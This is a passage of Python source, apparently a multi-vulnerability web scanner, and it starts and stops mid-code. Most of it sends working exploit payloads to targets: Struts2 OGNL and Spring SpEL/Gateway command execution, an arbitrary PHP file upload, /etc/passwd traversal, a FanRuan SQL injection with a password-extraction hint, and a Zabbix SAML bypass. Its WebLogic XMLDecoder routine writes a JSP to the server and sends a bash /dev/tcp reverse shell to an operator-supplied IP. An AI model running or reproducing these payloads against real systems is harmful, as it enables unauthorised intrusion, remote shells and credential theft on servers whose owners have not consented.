            # 判断响应时间是否异常
            if xxe_time > (normal_time * 2) or "root:" in response.text:
                with open('./result/xxe.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass
        self._ot.print_out("xxe检测结束")

    def _struts(self, url):
        host = url
        cmd = "ping"
        ognl_payload = "${"
        ognl_payload += "(#_memberAccess['allowStaticMethodAccess']=true)."
        ognl_payload += "(#cmd='{}').".format(cmd)
        ognl_payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        ognl_payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'bash','-c',#cmd}))."
        ognl_payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        ognl_payload += "(#p.redirectErrorStream(true))."
        ognl_payload += "(#process=#p.start())."
        ognl_payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        ognl_payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        ognl_payload += "(#ros.flush())"
        ognl_payload += "}"

        # encode the payload
        ognl_payload_encoded = requests.utils.quote(ognl_payload)

        # further encoding
        url = "{}/{}/help.action".format(host, ognl_payload_encoded.replace("+", "%20").replace(" ", "%20").replace("%2F", "/"))

        try:
            response = requests.get(url=url, timeout=5, verify=gl_verify, cookies=gl_cookie, headers=gl_headers, proxies=gl_proxy)
        except requests.exceptions.RequestException as e:
            pass
            return

        if response.status_code == 200 and "ping" in response.text:
            # 使用subprocess库执行命令
            try:
                output = subprocess.check_output(cmd, shell=True)
            except Exception as e:
                pass
            with open('./result/struts.txt', 'a') as w:
                w.write(url + '\n')
        else:
            pass

    def _struts2(self, url):
        cmd = "ping"
        payload = "%{(#_='multipart/form-data')."
        payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        payload += "(#_memberAccess?"
        payload += "(#_memberAccess=#dm):"
        payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        payload += "(#ognlUtil.getExcludedPackageNames().clear())."
        payload += "(#ognlUtil.getExcludedClasses().clear())."
        payload += "(#context.setMemberAccess(#dm))))."
        payload += "(#cmd='%s')." % cmd
        payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
        payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
        payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        payload += "(#ros.flush())}"

        try:
            struts_headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
            res = requests.post(url, headers=struts_headers, data={}, verify=gl_verify, proxies=gl_proxy)
            if res.status_code == 200 and "ping" in res.text:
                with open('./result/struts.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _struts_work(self, url, threads):
        self._ot.print_out("开始Struts漏洞检测......")
        work_list = [
            self._struts,
            self._struts2
        ]
        time.sleep(1)
        with tqdm(total=len(work_list), desc='Struts检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(job, url) for job in work_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Struts检测结束")

    def _cmd(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, timeout=3, cookies=gl_cookie, verify=gl_verify, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if "ping" in response.text:
                with open('./result/cmd.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _cmd_work(self, link_list, threads):
        self._ot.print_out("开始Cmd命令执行检测......")
        new_url_list = []
        for url in link_list:
            counts = url.count('=')
            for num in range(1, counts + 1):
                cmd_url = url.replace(url.split('=')[num].split('&' or '/')[0], 'ping')
                new_url_list.append(cmd_url)
        time.sleep(1)
        with tqdm(total=len(new_url_list), desc='Cmd命令执行检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._cmd, url) for url in new_url_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Cmd命令执行检测结束")

    def _spring(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, verify=gl_verify, timeout=2, cookies=gl_cookie, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and "404" not in response.text:
                with open('./result/spring.txt', 'a') as w:
                    w.write("可能存在Spring铭感信息:" + url + '\n')
        except Exception as e:
            pass

    def _spring_work(self, url, threads):
        self._ot.print_out('开始扫描spring信息......')
        spring_list = [
            '/actuator/health',
            '/actuator/info',
            '/actuator/metrics',
            '/actuator/loggers',
            '/actuator/trace',
            '/actuator/beans',
            '/actuator/mappings',
            '/actuator/env'
            '/actuator/auditevents',
            '/actuator/shutdown',
            '/actuator/redis/info'
        ]
        time.sleep(1)
        with tqdm(total=len(spring_list), desc='Spring信息检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._spring, url + payload) for payload in spring_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Spring信息检测结束")

    def _spring_rce(self, url):
        self._ot.print_out('开始检测Spring-Rce漏洞......')
        command = "ping -h"
        headers = {"Content-Type": "application/json", 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36', 'Accept': '*/*'}
        id = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
        payload = {"id": id, "filters": [
            {"name": "AddResponseHeader",
             "args": {"name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\u0022" + command + "\u0022).getInputStream()))}"}}],
                   "uri": "http://example.com"}

        commandb64 = base64.b64encode(command.encode('utf-8')).decode('utf-8')
        try:
            rbase = requests.post(url + '/actuator/gateway/routes/' + id, headers=headers, data=json.dumps(payload), verify=gl_verify, proxies=gl_proxy)
            if (rbase.status_code == 201):
                print("[+] Stage deployed to /actuator/gateway/routes/" + id)
                r = requests.post(url + '/actuator/gateway/refresh', headers=headers, verify=gl_verify, proxies=gl_proxy)
                if (r.status_code == 200):
                    r = requests.get(url + '/actuator/gateway/routes/' + id, headers=headers, verify=gl_verify, proxies=gl_proxy)
                    if (r.status_code == 200):
                        with open('./result/spring.txt', 'a') as w:
                            w.write(url + '/actuator/gateway/routes/' + id + '\n')
        except Exception as e:
            pass
        self._ot.print_out("Spring-Rce漏洞检测结束")

    def _spring_spel(self, url):
        self._ot.print_out('开始检测Spring-SpEl漏洞......')
        new_url = url + "/functionRouter"
        headers = {
            "Host": url.split('/')[2],
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
            "spring.cloud.function.routing-expression": 'T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")'
        }
        try:
            response = requests.post(url=new_url, headers=headers, data="test", verify=gl_verify, proxies=gl_proxy, timeout=5)
            response.encoding = response.apparent_encoding
            if "Internal" in response.text:
                with open('./result/spring.txt', 'a') as w:
                    w.write("存在spring-spel漏洞:" + new_url + "请求体:" + str(headers) + "可通过响应体是否存在Internal Sever Error来验证漏洞\n")
        except Exception as e:
            pass
        self._ot.print_out("Spring-SpEl漏洞检测结束")

    def _ssit(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, verify=gl_verify, cookies=gl_cookie, timeout=2, proxies=gl_proxy)
            if response.status_code == 200 and "9801" in response.text:
                with open('./result/moban.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _ssit_work(self, link_list, threads):
        self._ot.print_out("开始检测模版注入......")
        self._ot.print_out("漏洞检测主要针对SSTI")
        self._ot.print_out("SSTI与CSTI的区别在于对结果的解析,CSTI由于存在客户端不会解析出结果,而SSTI会解析出结果")
        self._ot.print_out("若不存在SSTI,可通过以下方式自行检测CSTI:")
        self._ot.print_out("例如{{config}}、{{self}}、{{request}}等敏感词")

        # ${{<%[%'"}}%\
        payloads = ['{{99*99}}', '${{99*99}}', '$eval("99*99")', "{{99*'99'}}", "{php}99*99{/php}", "${99*99}", "<%99*99%>", "{%99*99%}", "{{-99*99-}}"]
        new_url_list = []
        for url in link_list:
            counts = url.count('=')
            for payload in payloads:
                for num in range(1, counts + 1):
                    mb_url = url.replace(url.split('=')[num].split('&' or '/')[0], payload)
                    if "http" in mb_url:
                        new_url_list.append(mb_url)
        if new_url_list:
            time.sleep(1)
            with tqdm(total=len(new_url_list), desc='CSTI/SSTI检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
                with ThreadPoolExecutor(threads) as pool:
                    try:
                        futures = [pool.submit(self._ssit, url) for url in new_url_list]
                    except Exception as e:
                        pass
                    for future in concurrent.futures.as_completed(futures):
                        future.result()
                        pbar.update(1)
                wait(futures)
            time.sleep(1)
            self._ot.print_out("模版注入检测结束")

    def _swagger(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, verify=gl_verify, cookies=gl_cookie, timeout=2, proxies=gl_proxy)
            if response.status_code == 200:
                with open('./result/swagger.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _swagger_work(self, threads):
        self._ot.print_out("开始扫描swagger信息......")
        swger_list = []
        with open('./data/swagger.txt', 'r') as swger_str:
            swger_str.seek(0)
            swger_lines = swger_str.readlines()
            for dir in swger_lines:
                swger_list.append(dir.strip())
        time.sleep(1)
        with tqdm(total=len(swger_list), desc='扫描Swagger信息进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._swagger, url) for url in swger_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Swagger信息检测结束")

    def _json_url_check(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
            if response.status_code == 200:
                with open('./result/json.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _json_url_check_work(self, threads):
        self._ot.print_out("开始扫描json文件......")
        time.sleep(1)
        js_url_list = []
        new_url_list = []
        try:
            with open('./result/js.txt', 'r') as js_str:
                js_str.seek(0)
                js_lines = js_str.readlines()
                for url in js_lines:
                    if url not in js_url_list:
                        js_url_list.append(url.strip())
        except Exception as e:
            pass
        if js_url_list:
            for url in js_url_list:
                json_url = url.replace('.js', '.json')
                new_url_list.append(json_url)
            time.sleep(1)
            with tqdm(total=len(new_url_list), desc='Json信息进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
                with ThreadPoolExecutor(threads) as pool:
                    try:
                        futures = [pool.submit(self._json_url_check, url) for url in new_url_list]
                    except Exception as e:
                        pass
                    for future in concurrent.futures.as_completed(futures):
                        future.result()
                        pbar.update(1)
                wait(futures)
            time.sleep(1)
            self._ot.print_out("Json信息检测结束")

    def _webpack_ym(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and ".js.map" in response.text:
                with open('./result/file.txt', 'a') as w:
                    w.write("webpack源码泄露:" + url + '\n')
        except Exception as e:
            pass

    def _webpack_ym_work(self, demo_url, threads):
        self._ot.print_out("开始检测Webpack源码泄露......")
        time.sleep(1)
        js_url_list = []
        try:
            with open('./result/js.txt', 'r') as js_str:
                js_str.seek(0)
                js_lines = js_str.readlines()
                for url in js_lines:
                    if url not in js_url_list:
                        if url.split('/')[2] == demo_url.split('/')[2]:
                            js_url_list.append(url.strip())
        except Exception as e:
            pass
        if js_url_list:
            time.sleep(1)
            with tqdm(total=len(js_url_list), desc='Webpack源码泄露检测', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
                with ThreadPoolExecutor(threads) as pool:
                    try:
                        futures = [pool.submit(self._webpack_ym, url + '.map') for url in js_url_list]
                    except Exception as e:
                        pass
                    for future in concurrent.futures.as_completed(futures):
                        future.result()
                        pbar.update(1)
                wait(futures)
            time.sleep(1)
        self._ot.print_out("Webpack源码泄露检测结束")

    def _cors(self, url):
        self._ot.print_out("开始检测cors漏洞......")
        origin = 'http://www.test.com'
        cors_headers = {'Origin': 'http://www.test.com'}
        try:
            response = requests.get(url=url, headers=cors_headers, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
            res = response.headers.get('Access-Control-Allow-Origin')
            if response.status_code == 200 and res == origin:
                with open('./result/cors.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass
        try:
            response2 = requests.post(url=url, headers=cors_headers, cookies=gl_cookie, verify=gl_verify, timeout=3, proxies=gl_proxy)
            res2 = response2.headers.get("Access-Control-Allow-Origin")
            if response2.status_code == 200 and origin == res2:
                print(f"[!] CORS misconfiguration found in POST request: {response2.headers}")
        except Exception as e:
            pass
        time.sleep(1)
        self._ot.print_out("cors检测结束")

    def _shiro(self, url):
        self._ot.print_out("开始验证是否使用shiro......")
        shiro_cookies = {"rememberMe": "xxxxx"}
        try:
            response = requests.get(url=url, headers=gl_headers, cookies=shiro_cookies, verify=gl_verify, timeout=3, proxies=gl_proxy)
            res = response.cookies
            if "rememberMe" in res:
                with open('./result/shiro.txt', 'a') as w:
                    w.write(url + '/n')
        except Exception as e:
            pass
        time.sleep(1)
        self._ot.print_out("shiro检测结束")

    def _ssrf(self, url):
        self._ot.print_out('开始检测ssrf漏洞......')
        # 定义一些测试用例，用于检测是否存在SSRF漏洞
        test_cases = [
            {'url': 'http://127.0.0.1'},
            {'url': 'http://localhost'},
            {'url': 'http://example.net'},
            {'url': 'http://invalid.com'},
            {'url': 'http://example.com', 'dns': '8.8.8.8'},
            {'url': 'http://example.com:22'},
            {'url': 'http://example.com/admin', 'method': 'POST'},
            {'url': 'http://example.com/', 'headers': {'X-Forwarded-For': '127.0.0.1'}},
            {'url': 'http://example.com', 'data': 'secret'},
        ]

        # 遍历所有测试用例，向目标URL发送请求，并检查响应结果是否包含预期字符串
        for test_case in test_cases:
            try:
                response = requests.request(method=test_case.get('method', 'GET'),
                                            url=url,
                                            proxies=gl_proxy,
                                            verify=gl_verify,
                                            params={'url': test_case['url']},
                                            headers=test_case.get('headers'),
                                            data=test_case.get('data'),
                                            timeout=5)
                if 'Connection refused' in response.text or 'Could not resolve host' in response.text:
                    with open('./result/ssrf.txt', 'a') as w:
                        w.write(url + '\n')

            except Exception as e:
                pass
        self._ot.print_out("ssrf检测结束")

    def _node_js(self, url):
        self._ot.print_out('开始检测Node.js漏洞......')
        new_url = url + "/api/getServices?name[]=$(echo -e 'zeeker' > test.txt)"
        try:
            response = requests.get(url=new_url, headers=gl_headers, verify=gl_verify, cookies=gl_cookie, timeout=3, proxies=gl_proxy)
            if response.status_code == 200 and "test.txt" in response.text:
                with open('./result/nodejs.txt', 'a') as w:
                    w.write(new_url + '\n')
        except Exception as e:
            pass
        self._ot.print_out("Node.js检测结束")

    def _juqery(self, url):
        self._ot.print_out("开始检测Juqery文件写入漏洞......")
        burp0_url = f"{url}/assets/plugins/jquery-file-upload//server/php/index.php"

        burp0_cookies = {"PHPSESSID": "0i5ht16te77l0rvv1o6p1vd49u"}

        burp0_headers = {"Content-Type": "multipart/form-data; boundary=a211583f728c46a09ca726497e0a5a9f", "Accept": "*/*", "Accept-Encoding": "gzip,deflate",
                         "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21", "Connection": "Keep-alive"}
        burp0_data = "--a211583f728c46a09ca726497e0a5a9f\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"jqueryfileupload_poc.php\"\r\n\r\n<?php phpinfo();?>\r\n--a211583f728c46a09ca726497e0a5a9f--"
        try:
            rsp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies=gl_proxy, verify=gl_verify)

            shell_addr = json.loads(rsp.content)['files'][0]['url']
            with open('./result/juqery.txt', 'a') as w:
                w.write(shell_addr + '\n')
        except Exception as e:
            pass
        self._ot.print_out("Juqery文件写入检测结束")

    def _django(self, url):
        self._ot.print_out("开始检测Django文件读取漏洞......")
        new_url = url + "/admin/doc/templates//etc/passwd/"
        try:
            response = requests.get(url=new_url, headers=gl_headers, verify=gl_verify, cookies=gl_cookie, timeout=3, proxies=gl_proxy).text
            if "root:" in response:
                with open('./result/django.txt', 'a') as w:
                    w.write(new_url + '\n')
        except Exception as e:
            pass
        self._ot.print_out("Django文件读取检测结束")

    # 帆软目录遍历
    def _fanruan_mlbl(self, url):
        new_url = url + "/WebReport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../..&currentUserName=admin&currentUserId=1&isWebReport=true"
        try:
            response = requests.get(url=new_url, cookies=gl_cookie, verify=gl_verify, timeout=3, headers=gl_headers, proxies=gl_proxy)
            if "XML" in response.text:
                with open('./result/fanruan.txt', 'a') as w:
                    w.write(new_url + '\n')
        except Exception as e:
            pass

    # 帆软文件读取
    def _fanrun_wjdq(self, url):
        new_url = url + "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
        try:
            response = requests.get(url=new_url, cookies=gl_cookie, verify=gl_verify, timeout=3, headers=gl_headers, proxies=gl_proxy)
            if "xml" in response.text:
                with open('./result/fanruan.txt', 'a') as w:
                    w.write(new_url + '\n')
        except Exception as e:
            pass
    def _fanrun_sql(self, url):
        new_url = url + "/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%201234%20as%20id"
        try:
            response = requests.get(url=new_url, cookies=gl_cookie, verify=gl_verify, timeout=3, headers=gl_headers, proxies=gl_proxy)
            if "1234" in response.text:
                with open('./result/fanruan.txt', 'a') as w:
                    w.write("漏洞构造URl:" + new_url + '存在1234则存在漏洞，可使用payload:/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager获取密码\n')
        except Exception as e:
            pass
    # 待验证xml判断
    def _fanruan_work(self, url, threads):
        self._ot.print_out('开始检测帆软漏洞......')
        work_list = [self._fanruan_mlbl, self._fanruan_mlbl, self._fanrun_sql]
        time.sleep(1)
        with tqdm(total=len(work_list), desc='帆软漏洞检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(work, url) for work in work_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("帆软漏洞检测结束")

    def _jsonp(self, url):
        sensitive_info = "username"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Referer": url
        }
        # 发送 JSONP 请求并获取响应
        try:
            response = requests.get(url, headers=headers, timeout=3, verify=gl_verify, cookies=gl_cookie, proxies=gl_proxy)
            response.raise_for_status()  # 检查响应状态码
            if response.status_code == 200 and sensitive_info in response.text:
                with open('./result/jsonp.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _jsonp_work(self, url, threads):
        self._ot.print_out("开始检测Jsonp漏洞......")
        jsonp_url_list = []
        jsonp_list = [
            '_callback',
            '_cb',
            'callback',
            'cb',
            'jsonp',
            'jsonpcallback',
            'jsonpcb',
            'jsonp_cb',
            'json',
            'jsoncallback',
            'jcb',
            'call',
            'callBack',
            'jsonpCallback',
            'jsonpCb',
            'jsonp_Cb',
            'jsonCallback',
            'ca',
        ]
        json_callback = "callback_function_name"
        sensitive_info = "username"

        # 构造 JSONP 请求的 URL
        json_params = urllib.parse.urlencode({"sensitive_info": sensitive_info})
        for poc in jsonp_list:
            jsonp_url = f"{url}/?{poc}={json_callback}&{json_params}"
            jsonp_url_list.append(jsonp_url)
        time.sleep(1)
        with tqdm(total=len(jsonp_url_list), desc='Jsonp检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._jsonp, res_url) for res_url in jsonp_url_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Jsonp漏洞检测结束")

    def _jboss(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, verify=gl_verify, cookies=gl_cookie, timeout=3, proxies=gl_proxy)
            if response.status_code == 200 and '404' not in response.text:
                with open('./result/jboss.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass

    def _jboss_work(self, url, threads):
        self._ot.print_out('开始检测Jboss未授权......')
        jb_url_list = []
        prot_list = ['', ':8080', ':4457', ':1099', ':8443']
        for port in prot_list:
            jb_url = url + f'{port}/jmx-console'
            jb_url_list.append(jb_url)
        time.sleep(1)
        with tqdm(total=len(jb_url_list), desc='Jboss未授权检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._jboss, url) for url in jb_url_list]
                except Exception as e:
                    pass
                for futrue in concurrent.futures.as_completed(futures):
                    futrue.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Jboss未授权检测结束")

    def _zabbix(self, url):
        try:
            response = requests.get(url=url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, proxies=gl_proxy, timeout=3)
            cookie = response.headers.get("Set-Cookie")
            sessionReg = re.compile("zbx_session=(.*?);")
            session = re.findall(sessionReg, cookie)[0]
            base64_decode = base64.b64decode(urllib.parse.unquote(session, encoding="utf-8"))
            session_json = json.loads(base64_decode)
            payload = '{"saml_data":{"username_attribute":"Admin"},"sessionid":"%s","sign":"%s"}' % (session_json["sessionid"], session_json["sign"])
            payload_encode = urllib.parse.quote(base64.b64encode(payload.encode()))
            with open('./result/zabbix.txt', 'a') as w:
                w.write(url + "\n未加密Payload：" + payload + "\n加密后Payload：" + payload_encode + '\n')
        except Exception as e:
            pass

    def _zabbix_work(self, url, threads):
        self._ot.print_out('开始检测Zabbix-Saml漏洞.....')
        ports = ['', ':10050', ':10051']
        url_list = []
        for port in ports:
            zb_url = url + f'{port}'
            url_list.append(zb_url)
        time.sleep(1)
        with tqdm(total=len(url_list), desc='Zabbix未授权检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._zabbix, res_url) for res_url in url_list]
                except Exception as e:
                    pass
                for future in concurrent.futures.as_completed(futures):
                    future.result()
                    pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Zabbix-Saml漏洞检测结束")

    def _joomla(self, url):
        new_url = url + '/api/index.php/v1/config/application?public=true'
        try:
            response = requests.get(url=new_url, headers=gl_headers, cookies=gl_cookie, verify=gl_verify, timeout=3)
            if response.status_code == 200:
                with open('./result/joomla.txt', 'a') as w:
                    w.write(new_url + '\n')
        except Exception as e:
            pass

    def _xssi(self, url):
        self._ot.print_out('开始检测xssi漏洞.....')
        try:
            xssi_payload = ")]}';\n"
            headers = {"Content-Type": "application/json"}
            response = requests.post(url=url, data=xssi_payload, headers=headers, verify=gl_verify, cookies=gl_cookie, proxies=gl_proxy)
            if ")]}';" in response.text:
                with open('./result/xssi.txt', 'a') as w:
                    w.write(url + '\n')
        except Exception as e:
            pass
        self._ot.print_out('xssi检测结束')

    def _weblogic(self, url):
        res_url = ''
        try:
            response = requests.get(url=url, headers=gl_headers, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=3)
            if response.status_code == 200 and 'error' not in response.text:
                res_url = url
                with open('./result/weblogic.txt', 'a') as w:
                    w.write(url + '文件写入路径:/bea_wls_internal/mac.jsp，如果hello存在则存在漏洞\n')
        except Exception as e:
            pass
        return res_url

    def _weblogic_shell(self, url, choose):
        web_header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0", "Content-Type": "text/xml"}
        web_xml = """
                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
                    <soapenv:Header>
                    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                    <java><java version="1.4.0" class="java.beans.XMLDecoder">
                    <object class="java.io.PrintWriter">
                    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/mac.jsp</string>
                    <void method="println">
                <string>
                    <![CDATA[
                <% out.print("hello"); %>
                    ]]>
                    </string>
                    </void>
                    <void method="close"/>
                    </object></java></java>
                    </work:WorkContext>
                    </soapenv:Header>
                    <soapenv:Body/>
                </soapenv:Envelope>
                """
        if choose == 'w':
            try:
                response = requests.get(url=url, headers=web_header, proxies=gl_proxy, data=web_xml, cookies=gl_cookie, verify=gl_verify, timeout=5)
                if response.status_code == 200 and 'error' not in response.text:
                    self._ot.print_out('文件已经写入:{url}')
                    with open('./result/weblogic.txt', 'a') as w:
                        w.write(url + '文件写入路径:%s/bea_wls_internal/mac.jsp，如果hello存在则存在漏洞\n' % url)
            except Exception as e:
                pass
        elif choose == 'n':
            ip = str(input(f'[{now_time}][*] 远程IP:'))
            port = str(input(f'[{now_time}][*] 远程端口:'))
            web_nc = f"""
                <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
                <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
                <java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="java.lang.ProcessBuilder">
                <array class="java.lang.String" length="3">
                <void index="0">
                <string>/bin/bash</string>
                </void>
                <void index="1">
                <string>-c</string>
                </void>
                <void index="2">
                <string>bash -i &gt;&amp; /dev/tcp/{ip}/{port} 0&gt;&amp;1</string>
                </void>
                </array>
                <void method="start"/></void>
                </java>
                </work:WorkContext>
                </soapenv:Header>
                <soapenv:Body/>
                </soapenv:Envelope>
            """
            try:
                response = requests.get(url=url, headers=web_header, proxies=gl_proxy, data=web_nc, cookies=gl_cookie, verify=gl_verify, timeout=5)
                if response.status_code == 200 and 'error' not in response.text:
                    self._ot.print_out('远程监听已成功执行')
            except Exception as e:
                pass

    def _weblogic_work(self, url, threads):
        self._ot.print_out('开始检测Weblogic漏洞......')
        res_list = []
        dir_list = [
            '/wls-wsat/CoordinatorPortType',
            '/wls-wsat/RegistrationPortTypeRPC',
            '/wls-wsat/ParticipantPortType',
            '/wls-wsat/RegistrationRequesterPortType',
            '/wls-wsat/CoordinatorPortType11',
            '/wls-wsat/RegistrationPortTypeRPC11',
            '/wls-wsat/ParticipantPortType11',
            '/wls-wsat/RegistrationRequesterPortType11',
            '/_async/AsyncResponseService',
            '/_async/AsyncResponseServiceJms',
            '/_async/AsyncResponseServiceHttps'
        ]
        port_list = ['', ':7001', ':8443', ':8001']
        time.sleep(1)
        with tqdm(total=len(dir_list) * len(port_list), desc='Weblogic检测进度', bar_format="{l_bar}{bar:30}{r_bar}", colour='black') as pbar:
            with ThreadPoolExecutor(threads) as pool:
                try:
                    futures = [pool.submit(self._weblogic, url + port + dir) for dir in dir_list for port in port_list]
                except Exception as e:
                    pass
            for future in concurrent.futures.as_completed(futures):
                res_list.append(future.result())
                pbar.update(1)
            wait(futures)
        time.sleep(1)
        self._ot.print_out("Weblogic检测结束")
        # self._weblogic_nc(res_list)

    # nc未完善
    def _weblogic_nc(self, res_list):
        if res_list:
            choose = input(f'[{now_time}][!] 检测到weblogic目录文件，是否尝试写入文件/远程监听/退出weblogic操作(w/n/exit)?')
            for url in res_list:
                if choose.lower() == 'w':
                    self._weblogic_shell(url, choose)
                elif choose.lower() == 'n':
                    self._weblogic_shell(url, choose)
                else:
                    break

    def _tomcat(self, url):
        data = 'hello,cve-2017-12615'
        try:
            response = requests.put(url + '/1.jsp/', data=data, headers=gl_headers, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
            response_end = requests.get(url + '/1.jsp', headers=gl_headers, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
            response_end.encoding = response_end.apparent_encoding
            if response_end.status_code == 200 and '12615' in response_end.text:
                with open('./result/tomcat.txt', 'a') as w:
                    w.write("cve-2017-12615,tomcat文件put写入地址:%s" % url + '/1.jsp/\n')
        except Exception as e:
            pass

    def _tomcat2(self, url):
        parems_url = f"{url}/cgi-bin/test.bat?&C:/Windows/System32/net+user"
        try:
            response = requests.get(parems_url, headers=gl_headers, proxies=gl_proxy, cookies=gl_cookie, verify=gl_verify, timeout=5)
            response.encoding = response.apparent_encoding
            if response.status_code == 200 and '用户账户' in response.text:
